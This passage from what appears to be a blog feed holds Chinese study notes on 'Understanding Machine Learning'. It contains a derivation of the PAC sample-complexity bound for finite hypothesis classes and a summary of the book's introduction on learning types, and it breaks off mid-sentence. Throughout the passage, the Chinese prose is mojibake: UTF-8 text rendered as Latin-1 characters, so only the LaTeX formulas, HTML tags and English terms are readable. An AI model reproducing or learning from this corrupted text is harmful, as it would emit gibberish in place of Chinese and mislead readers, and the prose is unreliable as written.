å°†ä¸ä¼šäº§ç”Ÿè¿‡æ‹Ÿåˆã€‚</strong></li></ul><p>é‚£ä¹ˆè‡³å°‘éœ€è¦å¤šå°‘è®­ç»ƒæ ·æœ¬å‘¢ï¼Ÿä¸‹é¢æˆ‘ä»¬è®¨è®ºè¿™ä¸ªé—®é¢˜</p><p>åœ¨æ­¤ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆå¼•å…¥ä¸¤ä¸ªå‡è®¾ï¼š</p><ol type="1"><li><strong>å¯å®ç°å‡è®¾</strong>ï¼ˆ<strong><em>The Realizability Assumption</em></strong>ï¼‰ï¼š<span class="math inline">\(\exists h^\star \in \mathcal{H},\ L_{(\mathcal{D},f)}(h^\star) = 0\)</span> ã€‚</li><li><strong>ç‹¬ç«‹åŒåˆ†å¸ƒå‡è®¾</strong>ï¼ˆ<strong><em>The i.i.d. Assumption</em></strong>ï¼‰ï¼šè®­ç»ƒæ•°æ®ä¸­æ¯ä¸€ä¸ªæ ·æœ¬éƒ½å…³äºåˆ†å¸ƒ <span class="math inline">\(\mathcal{D}\)</span> <strong>ç‹¬ç«‹åŒåˆ†å¸ƒ</strong>ï¼ˆ<strong>independently and identically distributed</strong>ï¼Œshort for <strong>i.i.d.</strong>ï¼‰ï¼Œè®°ä½œ <span class="math inline">\(S\sim D^m\)</span> ã€‚å…¶ä¸­ï¼Œ <span class="math inline">\(m\)</span> æ˜¯ <span class="math inline">\(S\)</span> çš„å¤§å°ï¼Œ<span class="math inline">\(D^m\)</span> è¡¨ç¤ºäº†æ ¹æ® <span class="math inline">\(\mathcal{D}\)</span> é‡‡æ · <span class="math inline">\(m\)</span> ä¸ªå…ƒç´ ï¼Œæ„æˆ <span class="math inline">\(m\)</span> å…ƒç»„ï¼Œä¸”æ¯ä¸€ä¸ªå…ƒç´ éƒ½ç‹¬ç«‹äº <span class="math inline">\(m\)</span> å…ƒç»„å…¶ä»–å…ƒç´ </li></ol><div class="note info"><p><strong>æœ‰å…³ <code>å¯å®ç°å‡è®¾</code> å’Œ <code>ç‹¬ç«‹åŒåˆ†å¸ƒå‡è®¾</code> çš„è¡¥å……è¯´æ˜</strong></p><ul><li><code>å¯å®ç°å‡è®¾</code> æš—ç¤ºäº†åœ¨éšæœºçš„è®­ç»ƒæ ·æœ¬ <span class="math inline">\(S\)</span> ï¼Œ<span class="math inline">\(S\)</span> ç”±ä» <span class="math inline">\(\mathcal{D}\)</span> ä¸­é‡‡æ ·ï¼Œåˆè¢« <span class="math inline">\(f\)</span> æ ‡è®°æ‰€å¾—ï¼Œ<span class="math inline">\(L_S(h^\star) = 0\)</span> çš„å¯èƒ½æ€§ä¸º 1ã€‚</li><li><code>ç‹¬ç«‹åŒåˆ†å¸ƒå‡è®¾</code> è¡¨ç¤ºæ¯ä¸€ä¸ª <span class="math inline">\(S\)</span> ä¸­ <span class="math inline">\(x_i\)</span> éƒ½æ˜¯å…¨æ–°åœ°ä» <span class="math inline">\(\mathcal{D}\)</span> ä¸­é‡‡æ ·ï¼Œå¹¶è¢« <span class="math inline">\(f\)</span> æ ‡è®°åç”Ÿæˆçš„ã€‚</li></ul></div><p>æ­¤å¤–ï¼Œå®šä¹‰ <span class="math inline">\(\delta\)</span> ä¸ºå–å¾—ä¸€ä¸ªä¸å…·ä»£è¡¨æ€§ï¼ˆ<em>nonrepresentative</em>ï¼‰çš„æ ·æœ¬çš„<strong>æ¦‚ç‡</strong>ï¼Œ<span class="math inline">\(1-\delta\)</span> ä¸ºé¢„æµ‹è¡Œä¸ºçš„<strong>ç½®ä¿¡å‚æ•°</strong>ï¼ˆ<em>confidence parameter</em>ï¼‰ã€‚</p><div class="note info"><p><strong>ä»€ä¹ˆå«ä¸å…·ä»£è¡¨æ€§ï¼ˆ<em>nonrepresentative</em>ï¼‰çš„æ ·æœ¬ï¼Ÿ</strong></p><ul><li>è¿™ä¸ªæ ·æœ¬ä¸èƒ½ä»£è¡¨å®ä¾‹çš„æ½œåœ¨è§„å¾‹ã€‚å¦‚ä¸€ä¸ªæ°´æœæœ¬èº«å¾ˆå¥½åƒï¼Œä½†æ˜¯ç¢°å·§è®­ç»ƒæ ·æœ¬éƒ½æ˜¯ä¸å¥½åƒçš„ï¼Œå¯¼è‡´å­¦ä¹ å™¨å­¦åˆ°äº†é”™è¯¯çš„ç»“è®ºã€‚å…¶ä¸­çš„ä¸å¥½åƒçš„è®­ç»ƒæ ·æœ¬å³æ˜¯ä¸å…·ä»£è¡¨æ€§çš„æ ·æœ¬ã€‚</li></ul></div><p>ç”±äºæˆ‘ä»¬ä¸èƒ½ç¡®ä¿å®Œç¾çš„æ ‡ç­¾é¢„æµ‹ï¼Œå› æ­¤è¿™é‡Œæˆ‘ä»¬è¿›ä¸€æ­¥å¼•å…¥å¦ä¸€ä¸ªç”¨æ¥è¡¡é‡é¢„æµ‹æ•ˆæœçš„å‚æ•°ï¼Œå³<strong>ç²¾åº¦å‚æ•°</strong>ï¼ˆ<em>accuracy parameter</em>ï¼‰ã€‚å…¶é€šå¸¸è®°ä½œ <span class="math inline">\(\epsilon\)</span> ã€‚æˆ‘ä»¬ç”¨å¦‚ä¸‹å…¬å¼æè¿°å­¦ä¹ å™¨æ˜¯å¦è·å¾—æˆåŠŸï¼š</p><ul><li>äº‹ä»¶ <span class="math inline">\(L_{(\mathcal{D},f)}(h_s)&gt;\epsilon\)</span> è¡¨ç¤ºå­¦ä¹ å™¨çš„<strong>å¤±è´¥</strong></li><li>äº‹ä»¶ <span class="math inline">\(L_{(\mathcal{D},f)}(h_S)\le \epsilon\)</span> è¡¨ç¤ºå­¦ä¹ å™¨çš„<strong>è¿‘ä¼¼æˆåŠŸ</strong>ã€‚</li></ul><p>ä»¤æˆ‘ä»¬æ„Ÿå…´è¶£çš„æ˜¯ï¼Œåœ¨ç”± <span class="math inline">\(m\)</span> ä¸ªå®ä¾‹æ„æˆçš„ <span class="math inline">\(m\)</span> å…ƒç»„é‡‡æ ·ï¼Œä¼šå¯¼è‡´å­¦ä¹ å™¨å¤±è´¥çš„æ¦‚ç‡çš„<strong>ä¸Šç•Œ</strong>ã€‚</p><p>è§„èŒƒçš„ï¼Œè®° <span class="math inline">\(S|_{x} = \lbrace x_1,\ \dots,\ x_m\rbrace\)</span> ä¸ºè®­ç»ƒæ•°æ®çš„å®ä¾‹ï¼Œæˆ‘ä»¬å¸Œæœ›æ‰¾åˆ°ä¸‹å¼çš„ä¸Šç•Œï¼š</p><p><span class="math display">\[\mathcal{D}(\lbrace S|_{x} : L_{(\mathcal{D},f)}(h_{S}) &gt; \epsilon \rbrace)\]</span></p><p>è®° <span class="math inline">\(\mathcal{H}_B\)</span> ä¸ºâ€œåçš„â€å‡è®¾ï¼Œå³</p><p><span class="math display">\[\mathcal{H}_B = \lbrace h\in\mathcal{H}: L_{(\mathcal{D},f)}(h) &gt; \epsilon\rbrace\]</span></p><p>å†ä»¤</p><p><span class="math display">\[M = \lbrace S|_x : \exists h\in \mathcal{H}_B, L_S(h) = 0 \rbrace\]</span></p><p>æ˜¾ç„¶ï¼Œ<span class="math inline">\(M\)</span> è¡¨ç¤ºäº†è¯¯å¯¼å­¦ä¹ å™¨çš„æ ·æœ¬é›†åˆã€‚æ¢å¥è¯è¯´ï¼Œå¯¹äºæ¯ä¸€ä¸ª <span class="math inline">\(S|_x \in M\)</span> ï¼Œå­˜åœ¨ä¸€ä¸ªåçš„å‡è®¾ï¼Œ<span class="math inline">\(h\in \mathcal{H}_B\)</span> ï¼Œä½†æ˜¯åœ¨ <span class="math inline">\(S|_x\)</span> ä¸­å®ƒçœ‹ä¸Šå»æ˜¯ä¸€ä¸ªå¥½çš„å‡è®¾ã€‚</p><p>æ—¢ç„¶å¯å®ç°å‡è®¾è¡¨ç¤ºå­˜åœ¨ <span class="math inline">\(L_S(h_S) = 0\)</span> ï¼Œå› æ­¤ï¼Œäº‹ä»¶ <span class="math inline">\(L_{(\mathcal{D},f)}(h_s)&gt;\epsilon\)</span> åªå¯èƒ½åœ¨è¿™ç§æƒ…å†µä¸‹å‘ç”Ÿï¼š<span class="math inline">\(h\in \mathcal{H}_B\)</span> ï¼Œä½†æ˜¯ <span class="math inline">\(L_S(h) = 0\)</span> ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œ<strong>å¦‚æœæˆ‘ä»¬çš„é‡‡æ ·æ ·æœ¬åœ¨è¯¯å¯¼é›†åˆä¸­ï¼Œè¿™ç§äº‹ä»¶æ‰ä¼šå‘ç”Ÿ</strong>ã€‚å› æ­¤ï¼Œæˆ‘ä»¬æœ‰ï¼š</p><p><span class="math display">\[\lbrace S|_{x} : L_{(\mathcal{D},f)}(h_S) &gt; \epsilon\rbrace \subseteq M\]</span></p><p>è¿›ä¸€æ­¥çš„ï¼Œ<span class="math inline">\(M\)</span> å¯æ”¹å†™æˆï¼š</p><p><span class="math display">\[M = \underset{h\in \mathcal{H}_B}{\bigcup} \lbrace S|_x : L_S(h) = 0\rbrace \tag{2.5}\]</span></p><p>å› æ­¤ï¼Œ</p><p><span class="math display">\[\mathcal{D}^m(\lbrace S|_x : L_{(\mathcal{D},f)}(h_S) &gt; \epsilon\rbrace) \le \mathcal{D}^m(M) = \mathcal{D}^m({\cup}_{h\in \mathcal{H}_B} \lbrace S|_x : L_S(h) = 0\rbrace) \tag{2.6}\]</span></p><p>åˆ©ç”¨ <code>Union Bound</code> å®šç†ï¼Œå¯å¾—ï¼š</p><p><span class="math display">\[\mathcal{D}^m(\lbrace S|_x : L_{(\mathcal{D},f)}(h_S) &gt; \epsilon\rbrace) \le \underset{h\in \mathcal{H}_B}{\sum}\mathcal{D}^m(\lbrace S|_x : L_S(h) = 0\rbrace)\tag{2.7}\]</span></p><div class="note info"><p><strong>å®šç†ï¼ˆUnion Boundï¼‰</strong></p><ul><li>å¯¹äºä¸¤ä¸ªé›†åˆ <span class="math inline">\(A\)</span>ï¼Œ<span class="math inline">\(B\)</span> å’Œåˆ†å¸ƒ <span class="math inline">\(\mathcal{D}\)</span> ï¼Œæœ‰ <span class="math display">\[\mathcal{D}(A\cup B) \le \mathcal{D}(A) + \mathcal{D}(B)\]</span></li></ul></div><p>ç”±äºäº‹ä»¶ <span class="math inline">\(L_S(h) = 0\)</span> ç­‰ä»·äº <span class="math inline">\(\forall i, h(x_i) = f(x_i)\)</span> ï¼Œæ‰€ä»¥ï¼Œ</p><p><span class="math display">\[\mathcal{D}^m(\lbrace S|_x : L_S(h) = 0\rbrace) = \mathcal{D}^m(\lbrace S|_x : \forall i, h(x_i) = f(x_i) \rbrace)\]</span></p><p>åˆå› ä¸ºé‡‡æ ·è®­ç»ƒæ ·æœ¬ç›¸äº’ç‹¬ç«‹ï¼Œä¸”æœä»åŒä¸€ä¸ªåˆ†å¸ƒ <span class="math inline">\(\mathcal{D}\)</span> ï¼Œå› æ­¤ï¼Œ</p><p><span class="math display">\[\mathcal{D}^m(\lbrace S|_x : \forall i, h(x_i) = f(x_i) \rbrace) = \prod_{i=1}^{m}\mathcal{D}(\lbrace x_i : h(x_i) = f(x_i) \rbrace)\]</span></p><p>æ•…æœ‰</p><p><span class="math display">\[\mathcal{D}^m(\lbrace S|_x : L_S(h) = 0\rbrace) = \prod_{i=1}^{m}\mathcal{D}(\lbrace x_i : h(x_i) = f(x_i) \rbrace) \tag{2.8}\]</span></p><p>å¯¹äºè®­ç»ƒé›†ä¸­æ¯ä¸€ä¸ªç‹¬ç«‹çš„å…ƒç´ ï¼Œæœ‰</p><p><span class="math display">\[{D}(\lbrace x_i : h(x_i) = y_i \rbrace) = 1 - L_{(\mathcal{D},f)}\]</span></p><p>ç”±äº <span class="math inline">\(L_{(\mathcal{D},f)}(h_s)&gt;\epsilon\)</span> ï¼Œæ•…</p><p><span class="math display">\[{D}(\lbrace x_i : h(x_i) = y_i \rbrace) = 1 - L_{(\mathcal{D},f)} \le 1 - \epsilon\]</span></p><p>åˆ©ç”¨ <span class="math inline">\(1-\epsilon \le e^{-\epsilon}\)</span> ä¸ç­‰å¼å¯¹ä¸Šå¼æ”¾ç¼©ï¼Œæœ‰</p><p><span class="math display">\[{D}(\lbrace x_i : h(x_i) = y_i \rbrace) = 1 - L_{(\mathcal{D},f)} \le 1 - \epsilon \le e^{- \epsilon}\]</span></p><p>å°†ä¸Šå¼å¸¦å…¥å¼ï¼ˆ2.8ï¼‰ï¼Œæœ‰</p><p><span class="math display">\[\mathcal{D}^m(\lbrace S|_x : L_S(h) = 0\rbrace)\le (1 - \epsilon)^m \le e^{- m\epsilon} \tag{2.9}\]</span></p><p>ç»“åˆå¼ï¼ˆ2.7ï¼‰ï¼Œæœ‰</p><p><span class="math display">\[\mathcal{D}^m(\lbrace S|_x : L_{(\mathcal{D},f)}(h_S) &gt; \epsilon\rbrace) \le |\mathcal{H}_B|e^{- m\epsilon} \le |\mathcal{H}|e^{- m\epsilon}\]</span></p><p>è®¾ <span class="math inline">\(\mathcal{D}^m(\lbrace S|_x : L_{(\mathcal{D},f)}(h_S) &gt; \epsilon\rbrace) \le |\mathcal{H}|e^{- m\epsilon}&lt; \delta\)</span> ï¼Œåˆ™æœ‰</p><p><span class="math display">\[m &gt; \frac{log(\frac{|\mathcal{H}|}{\delta})}{\epsilon}\]</span></p><div class="note info"><p><strong>æ¨å¯¼è¿‡ç¨‹</strong></p><p><span class="math display">\[\delta &gt; |\mathcal{H}|e^{-m\epsilon}\]</span></p><p><span class="math display">\[log\delta &gt; log|\mathcal{H}|-m\epsilon\]</span></p><p><span class="math display">\[m\epsilon &gt; log|\mathcal{H}| - log\delta\]</span></p><p><span class="math display">\[m&gt; \frac{log(\frac{|\mathcal{H}|}{\delta})}{\epsilon}\]</span></p></div><p>ç»¼ä¸Šæ‰€è¿°ï¼Œæœ‰å¦‚ä¸‹é‡è¦ç»“è®ºï¼š</p><div class="note info"><p>è®¾ <span class="math inline">\(\mathcal{H}\)</span> ä¸ºä¸€ä¸ªæœ‰é™çš„å‡è®¾ç±»ï¼Œä»¤ <span class="math inline">\(\delta \in (0,1)\)</span> ï¼Œ<span class="math inline">\(\epsilon &gt; 0\)</span> ï¼Œ<span class="math inline">\(m\)</span> ä¸ºä¸€ä¸ªæ»¡è¶³ä»¥ä¸‹æ¡ä»¶çš„æ•´æ•°ï¼š <span class="math display">\[m&gt; \frac{log(\frac{|\mathcal{H}|}{\delta})}{\epsilon}\]</span> é‚£ä¹ˆï¼Œå¯¹äºä»»æ„çš„æ ‡è®°å‡½æ•° <span class="math inline">\(f\)</span> ï¼Œä»»æ„çš„åˆ†å¸ƒ <span class="math inline">\(\mathcal{D}\)</span> ï¼Œå¦‚æœæ»¡è¶³å¯å®ç°å‡è®¾ï¼ˆå³ï¼Œå­˜åœ¨ <span class="math inline">\(h\in \mathcal{H}\)</span> ï¼Œä½¿å¾— <span class="math inline">\(L_{(\mathcal{D},f)}(h) = 0\)</span>ï¼‰ï¼Œåˆ™è‡³å°‘æœ‰ <span class="math inline">\(1-\delta\)</span> çš„å¯èƒ½æ€§ï¼Œåœ¨ <span class="math inline">\(S\)</span> ä¸Šç‹¬ç«‹é‡‡æ · <span class="math inline">\(m\)</span> ä¸ªç‚¹ï¼Œå¯¹äºæ¯ä¸€ä¸ª <span class="math inline">\(ERM\)</span> å‡è®¾ï¼Œæ»¡è¶³å¦‚ä¸‹å¼å­ï¼š <span class="math display">\[L_{(\mathcal{D},f)}(h_S) \le \epsilon\]</span></p></div><p>è¿™ä¸ªç»“è®ºæ„å‘³ç€ï¼Œåªè¦æœ‰è¶³å¤Ÿçš„è®­ç»ƒæ•°æ®ï¼ˆ<span class="math inline">\(m&gt; \frac{log(\frac{|\mathcal{H}|}{\delta})}{\epsilon}\)</span>ï¼‰ï¼Œåœ¨æœ‰é™å‡è®¾ç±»ä¸Šçš„ <span class="math inline">\(ERM_{\mathcal{H}}\)</span> ä¼šå°½å¯èƒ½è¿‘ä¼¼æ­£ç¡®ï¼ˆå…¶ç½®ä¿¡å‚æ•°ä¸º <span class="math inline">\(1-\delta\)</span> ï¼Œæœ€å¤§çš„è¯¯å·®ä¸º <span class="math inline">\(\epsilon\)</span>ï¼‰ã€‚</p><h1 id="reference">Reference</h1><p>Shai Shalev-Shwartz, Shai Ben-David. <a href="https://www.cs.huji.ac.il/~shais/UnderstandingMachineLearning/index.html" target="_blank" rel="noopener">Understanding Machine Learning: From Theory to Algorithms</a></p>]]></content>
        <author>
            <name><![CDATA[CosmosNingçš„ä¸ªäººåšå®¢]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://cosmosning.github.io/2020/09/13/intro-to-ml/</id>
        <title><![CDATA[ã€Šä»ç†è®ºåˆ°ç®—æ³•ç†è§£æœºå™¨å­¦ä¹ ã€‹å¼•è¨€]]></title>
        <updated>2021-05-14T12:17:25+08:00</updated>
        <link href="https://cosmosning.github.io/2020/09/13/intro-to-ml/"/>
        <content type="text/html" src="https://cosmosning.github.io/2020/09/13/intro-to-ml/"><![CDATA[<blockquote><p>æœ€è¿‘ä¸Šäº†ä¸€é—¨è¯¾ï¼Œå«åšâ€œæ™ºèƒ½ä¿¡æ¯æ£€ç´¢â€ã€‚è€å¸ˆæ¨èäº†ä¸€æœ¬æ•™æ ã€ŠUnderstanding Machine Learning: From Theory to Algorithmsã€‹ï¼ˆæ–‡æœ«æä¾›å®˜æ–¹ä¸‹è½½é“¾æ¥ï¼‰ï¼Œæ¥è§£é‡Š<strong>æ™ºèƒ½</strong>çš„å«ä¹‰ã€‚æœ¬æ–‡åŸºäºæˆ‘å¯¹æ•™æçš„ç†è§£ï¼Œå¯¹å…¶å¼•è¨€éƒ¨åˆ†åšäº†ä¸€äº›è¦ç‚¹æ¦‚æ‹¬ï¼Œä¾›è¯»è€…å‚è€ƒã€‚</p></blockquote><h1 id="what-is-learning">What Is Learningï¼Ÿ</h1><p>ç²—ç•¥åœ°è®²ï¼Œ<strong>å­¦ä¹ æ˜¯ä¸€ä¸ªå°†ç»å†ï¼ˆ<em>experience</em>ï¼‰è½¬æ¢ä¸ºæŠ€èƒ½ï¼ˆ<em>expertise</em>ï¼‰æˆ–çŸ¥è¯†ï¼ˆ<em>knowledge</em>ï¼‰çš„è¿‡ç¨‹</strong>ã€‚ä¸€èˆ¬åœ°ï¼Œä¸€ä¸ªå­¦ä¹ ç®—æ³•çš„<strong>è¾“å…¥</strong>æ˜¯<strong>è®­ç»ƒæ•°æ®</strong>ï¼ˆä»£è¡¨ç»å†ï¼‰ï¼Œ<strong>è¾“å‡º</strong>æ˜¯<strong>æŠ€èƒ½</strong>ã€‚</p><p>ä¸€ç§å¸¸è§çš„å­¦ä¹ æ–¹æ³•æ˜¯ â€œè®°å¿†å­¦ä¹ â€ï¼ˆ<em>learning by memorization</em>ï¼‰ã€‚ç±»ä¼¼äººç±»å­¦ä¹ çš„â€œæ­»è®°ç¡¬èƒŒâ€ï¼Œè¿™ç§å­¦ä¹ æ–¹æ³•æœ‰æ—¶å€™ååˆ†æœ‰æ•ˆï¼Œä½†æ˜¯å®ƒå´ç¼ºå¤±äº†å­¦ä¹ ç³»ç»Ÿä¸­ä¸€ä¸ªååˆ†é‡è¦çš„èƒ½åŠ›ï¼Œå³<strong>æ³›åŒ–èƒ½åŠ›</strong>ï¼ˆ<em>generalization</em>ï¼‰ã€‚æ¢å¥è¯è®²ï¼Œä¸€ä¸ªæˆåŠŸçš„å­¦ä¹ ç³»ç»Ÿç†åº”èƒ½å¤Ÿä¾æ®å·²çŸ¥çŸ¥è¯†ï¼Œæ­£ç¡®å¤„ç†æœªçŸ¥çš„æƒ…å†µã€‚</p><div class="note info"><p><strong>æ³›åŒ–èƒ½åŠ›</strong> ï¼ˆ<em>generalization</em>ï¼‰ æœ‰æ—¶ä¹Ÿè¢«ç§°ä½œ<strong>å½’çº³æ¨ç†</strong> ï¼ˆ<em>inductive reasoning / inductive inference</em>ï¼‰</p></div><p>ç„¶è€Œï¼Œ<strong>å½’çº³æ¨ç†å¯èƒ½ä¼šå¯¼è‡´é”™è¯¯ç»“è®º</strong>ã€‚é‚£ä¹ˆæ€æ ·æ‰èƒ½å‡å°‘çŠ¯é”™å‘¢ï¼Ÿ</p><p>ç­”æ¡ˆæ˜¯ï¼šåœ¨å­¦ä¹ ç³»ç»Ÿä¸­<strong>å¼•å…¥å…ˆéªŒçŸ¥è¯†</strong>ï¼ˆ<em>prior knowledge</em>ï¼‰ï¼</p><div class="note info"><p><strong>å…ˆéªŒçŸ¥è¯†</strong>ï¼ˆ<em>prior knowledge</em>ï¼‰ æœ‰æ—¶ä¹Ÿè¢«ç§°ä½œ<strong>å½’çº³åå¥½</strong> ï¼ˆ<em>inductive bias</em>ï¼‰</p></div><p>ä»ä¹¦ä¸­ä¸¾å¾—å‡ ä¸ªä¾‹å­æ¥çœ‹ï¼Œ<strong>å¼•å…¥å…ˆéªŒçŸ¥è¯†ï¼Œä½¿æ•´ä¸ªå­¦ä¹ è¿‡ç¨‹å¸¦æœ‰åå¥½ï¼Œæ˜¯ä¸€ä¸ªæˆåŠŸçš„å­¦ä¹ ç®—æ³•å¿…ç„¶å‘ç”Ÿçš„äº‹æƒ…</strong>ï¼ˆè¿™ç§ç°è±¡æ˜¯ <strong>No-Free-Lunch Theorem</strong> çš„å…·ä½“è¡¨ç°ï¼‰ã€‚ç²—ç•¥æ¥è¯´ï¼Œå­¦ä¹ ç®—æ³•å¼€å§‹è®­ç»ƒæ—¶æ‰€å¼•å…¥çš„å…ˆéªŒçŸ¥è¯†è¶Šå¼ºï¼Œä»è®­ç»ƒæ ·æœ¬ä¸­å­¦ä¹ å°±è¶Šç®€å•ã€‚ä½†æ˜¯ï¼Œå…ˆéªŒçŸ¥è¯†è¶Šå¼ºï¼Œå­¦ä¹ çš„çµæ´»æ€§ä¹Ÿå°±è¶Šä½ï¼Œå› ä¸ºæ•´ä¸ªå­¦ä¹ è¿‡ç¨‹è¢«è¿™äº›é¢„å®šå‡è®¾æŸç¼šä½äº†ã€‚</p><h1 id="when-we-need-machine-learning">When We Need Machine Learningï¼Ÿ</h1><p>é‚£ä¹ˆï¼Œåœ¨å“ªäº›æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬éœ€è¦åˆ©ç”¨æœºå™¨å­¦ä¹ è§£å†³é—®é¢˜å‘¢ï¼Ÿä¸»è¦æœ‰ä»¥ä¸‹ä¸¤ä¸ªæ–¹é¢ï¼š</p><ul><li>é—®é¢˜çš„å¤æ‚æ€§ï¼ˆ<em>complexity</em>ï¼‰</li><li>ä»»åŠ¡çš„é€‚åº”æ€§éœ€æ±‚ï¼ˆ<em>adaptivity</em>ï¼‰</li></ul><h2 id="tasks-that-are-to-complex-to-program">Tasks That Are to Complex to Program</h2><ul><li><em>Tasks Performed by Animals / Humans</em>ï¼šæˆ‘ä»¬æš‚æ—¶æ— æ³•ç†è§£ä¸€äº›æˆ‘ä»¬èƒ½å¤Ÿå¤„ç†çš„æ—¥å¸¸ä»»åŠ¡ï¼Œä¾‹å¦‚é©¾é©¶æ±½è½¦ã€è¯­éŸ³è¯†åˆ«ã€å›¾åƒç†è§£ã€‚ä»¥ç°æœ‰çš„çŸ¥è¯†ï¼Œéš¾ä»¥æŠ½è±¡å‡ºä¸€ä¸ªè‰¯å¥½çš„ç¨‹åºå»æ‰§è¡Œè¿™äº›ä»»åŠ¡ã€‚ç„¶è€Œï¼Œå…ˆè¿›çš„æœºå™¨å­¦ä¹ ç¨‹åºï¼Œåªè¦æ¥å—è¶³å¤Ÿçš„è®­ç»ƒæ ·æœ¬è®­ç»ƒï¼Œå°±å¯ä»¥ä»ä¸­å­¦ä¹ ç»éªŒï¼Œå¹¶åœ¨è¿™äº›ä»»åŠ¡ä¸­è¾¾åˆ°ä¸é”™çš„æ•ˆæœã€‚</li><li><em>Tasks beyond Human Capabilities</em>ï¼šå¦ä¸€ç±»é€‚åˆç”¨æœºå™¨å­¦ä¹ è§£å†³çš„é—®é¢˜æ˜¯å¯¹å·¨å¤§çš„ä¸”å¤æ‚çš„æ•°æ®ï¼ˆä¾‹å¦‚å®‡å®™ç©ºé—´æ•°æ®ã€åŒ»ç–—æ•°æ®ã€å¤©æ°”æ•°æ®ç­‰ï¼‰è¿›è¡Œåˆ†æã€‚è¿™äº›æ•°æ®çš„å¤„ç†å’Œåˆ†æé€šå¸¸è¶…è¶Šäº†æˆ‘ä»¬è‡ªèº«çš„åˆ†æèƒ½åŠ›ã€‚ä½¿ç”¨æœºå™¨å­¦ä¹ ï¼Œå¯ä»¥å……åˆ†åˆ©ç”¨è®¡ç®—æœºçš„èƒ½åŠ›ï¼Œæ‰¾åˆ°æ•°æ®ä¸­æœ‰ä»·å€¼çš„ä¿¡æ¯ã€‚</li></ul><h2 id="adaptivity">Adaptivity</h2><ul><li>é¢„å…ˆç¼–ç¨‹çš„ç¨‹åºæœ‰ä¸€ä¸ªç¼ºé™·ï¼Œå³æ­»æ¿æ€§ï¼ˆ<em>rigidity</em>ï¼‰ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€æ—¦ç¨‹åºå†™å¥½äº†ï¼Œå®‰è£…åˆ°ç³»ç»Ÿä¸­åï¼Œç¨‹åºå°±ä¸ä¼šå˜åŒ–äº†ã€‚ç„¶è€Œï¼Œç°å®ä¸­è®¸å¤šä»»åŠ¡éƒ½æ˜¯åœ¨ä¸æ–­å˜åŒ–çš„ã€‚</li><li>è€Œæœºå™¨å­¦ä¹ ï¼ˆå…¶å¤©ç”Ÿå¯ä»¥é€‚åº”ä¸åŒçš„è¾“å…¥æ•°æ®ï¼‰æä¾›äº†ä¸€ç§è§£å†³æ­¤ç±»ä»»åŠ¡çš„æ–¹æ¡ˆã€‚</li></ul><h1 id="types-of-learning">Types of Learning</h1><h2 id="supervised-versus-unsupervised">Supervised versus Unsupervised</h2><p>å¦‚æœå°†å­¦ä¹ çœ‹ä½œæ˜¯ä¸€ä¸ªâ€œåˆ©ç”¨ç»å†æ¥è·å–æŠ€èƒ½â€çš„è¿‡ç¨‹ï¼Œé‚£ä¹ˆç›‘ç£å­¦ä¹ å’Œéç›‘ç£å­¦ä¹ å¯ä»¥æè¿°å¦‚ä¸‹ï¼š</p><ul><li><strong>ç›‘ç£ï¼ˆ<em>Supervised</em>ï¼‰å­¦ä¹ </strong>ï¼šåœ¨è¯¥åœºæ™¯ä¸­ï¼Œâ€œç»å†â€ï¼ˆäº¦å¯ç§°ä½œè®­ç»ƒæ ·æœ¬ï¼‰åŒ…å«äº†ååˆ†é‡è¦çš„ä¿¡æ¯ï¼›è€Œè¿™äº›ä¿¡æ¯å´åœ¨æµ‹è¯•æ ·æœ¬ä¸­ä¸¢å¤±äº†ã€‚ä»ç›‘ç£å­¦ä¹ ä¸­å­¦ä¹ åˆ°çš„æŠ€èƒ½çš„ç›®æ ‡æ˜¯ï¼Œé¢„æµ‹æµ‹è¯•æ•°æ®ä¸­çš„ç¡®å®ä¿¡æ¯ã€‚è¿™å°±å¥½åƒç¯å¢ƒä½œä¸ºä¸€åè€å¸ˆé€šè¿‡æä¾›é¢å¤–çš„ä¿¡æ¯ï¼ˆé€šå¸¸ç§°ä½œ<strong>â€œæ ‡ç­¾â€</strong> <em>label</em>ï¼‰"ç›‘ç£"å­¦ç”Ÿï¼ˆå­¦ä¹ ç®—æ³•ï¼‰çš„å­¦ä¹ ã€‚</li><li><strong>éç›‘ç£ï¼ˆ<em>Unsupervised</em>ï¼‰å­¦ä¹ </strong>ï¼šå¯¹äºéç›‘ç£å­¦ä¹ æ¥è¯´ï¼Œè®­ç»ƒæ•°æ®å’Œæµ‹è¯•æ•°æ®å‡ ä¹æ²¡ä»€ä¹ˆåŒºåˆ«ã€‚é€šå¸¸ï¼Œè¿™ç§å­¦ä¹ æ–¹æ³•é€šè¿‡å¤„ç†è¾“å…¥æ•°æ®ï¼Œæ¥è¾¾åˆ°<strong>æ€»ç»“æ•°æ®</strong>ã€<strong>å‹ç¼©æ•°æ®</strong>çš„ç›®æ ‡ã€‚<strong>èšç±»</strong>â€”â€”å°†ä¸€ä¸ªæ•°æ®é›†åˆ†æˆå‡ ä¸ªå­é›†ï¼ŒåŒä¸€å­é›†å…·æœ‰ç›¸ä¼¼æ€§â€”â€”æ˜¯éç›‘ç£å­¦ä¹ ä¸­ä¸€ä¸ªå…¸å‹çš„ä¾‹å­ã€‚</li><li>åœ¨ç›‘ç£ä¸éç›‘ç£ä¹‹é—´ï¼Œè¿˜å­˜åœ¨ä¸€ç§ä¸åŒçš„æ–¹æ³•â€”â€”<strong>å¼ºåŒ–å­¦ä¹ </strong>ã€‚</li></ul><h2 id="active-versus-passive">Active versus Passive</h2><ul><li><strong>ä¸»åŠ¨ï¼ˆ<em>Active</em>ï¼‰å­¦ä¹ </strong>ï¼šä¸»åŠ¨å­¦ä¹ åœ¨åœ¨è®­ç»ƒè¿‡ç¨‹ä¸­å°†ä¼šä¸ç¯å¢ƒäº¤äº’ã€‚</li><li><strong>è¢«åŠ¨ï¼ˆ<em>Passive</em>ï¼‰å­¦ä¹ </strong>ï¼šè¢«åŠ¨å­¦ä¹ åªä¼šè§‚æµ‹ç¯å¢ƒæ‰€æä¾›çš„ä¿¡æ¯ï¼Œè€Œä¸ä¼šå½±å“ï¼ˆinfluenceï¼‰æˆ–æŒ‡å¯¼ï¼ˆdirectï¼‰å®ƒã€‚</li></ul><div class="note info"><p><strong>ä¾‹å­</strong></p><ul><li>åƒåœ¾é‚®ä»¶è¯†åˆ«é€šå¸¸æ˜¯è¢«åŠ¨å­¦ä¹ ï¼Œå› ä¸ºå®ƒç­‰ç€ç”¨æˆ·ä¸ºå®ƒæ 